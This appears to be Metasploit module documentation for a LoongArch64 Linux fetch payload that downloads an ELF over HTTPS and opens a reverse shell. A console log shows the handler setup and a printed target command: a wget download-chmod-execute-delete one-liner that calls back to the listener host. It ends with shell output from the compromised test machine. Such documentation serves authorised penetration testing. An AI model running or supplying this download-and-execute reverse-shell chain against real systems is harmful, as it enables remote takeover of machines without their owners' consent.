## Vulnerable Application

This adapter downloads a Linux LoongArch64 ELF over HTTPS and executes it.
No vulnerable application is required; the generated command must run on a
Linux LoongArch64 system with an HTTPS-capable download utility installed.

## Verification Steps

1. Prepare a Linux LoongArch64 host with WGET and `/bin/sh`.
1. Start `./msfconsole` and select `use exploit/multi/handler`.
1. Set `PAYLOAD` to `cmd/linux/https/loongarch64/shell_reverse_tcp`.
1. Set `LHOST`, `LPORT`, `FETCH_COMMAND` to `WGET`, and `VERBOSE` to `true`.
1. Run the handler and execute the printed fetch command on the test host.
1. In the resulting shell, run `id` and `uname -a`.

## Options

No specific options

## Scenarios

```msf
PAYLOAD => cmd/linux/https/loongarch64/shell_reverse_tcp
LHOST => 10.5.135.210
LPORT => 50103
FETCH_SRVHOST => 10.5.135.210
FETCH_SRVPORT => 8443
FETCH_URIPATH => pr21954-https
FETCH_COMMAND => WGET
FETCH_WRITABLE_DIR => /tmp
FETCH_FILENAME => pr21954-https.elf
FETCH_DELETE => true
ExitOnSession => false
VERBOSE => true
[*] Command to execute on target: wget -qO /tmp/pr21954-https.elf --no-check-certificate https://10.5.135.210:8443/pr21954-https;chmod +x /tmp/pr21954-https.elf;/tmp/pr21954-https.elf&sleep 4;rm -rf /tmp/pr21954-https.elf
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit(multi/handler) >
[*] Fetch handler listening on 10.5.135.210:8443
[*] HTTPS server started
[*] Adding resource /pr21954-https
[*] Started reverse TCP handler on 10.5.135.210:50103
[*] Client 10.5.132.181 requested /pr21954-https
[*] Sent payload to 10.5.132.181 (Wget/1.20.1 (linux-gnu))
[*] Command shell session 1 opened (10.5.135.210:50103 -> 10.5.132.181:47520) at 2026-10-20 15:36:25 -0500
sessions -i 1
[*] Starting interaction with 1...

uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),114(bluetooth),116(scanner),117(lpadmin)
Linux morefinels64 4.19.0-19-loongson-3 #1 SMP 4.19.190.8.26 Wed Oct 15 02:40:20 UTC 2025 loongarch64 loongarch64 loongarch64 GNU/Linux
[*] 10.5.132.181 - Command shell session 1 closed.

```

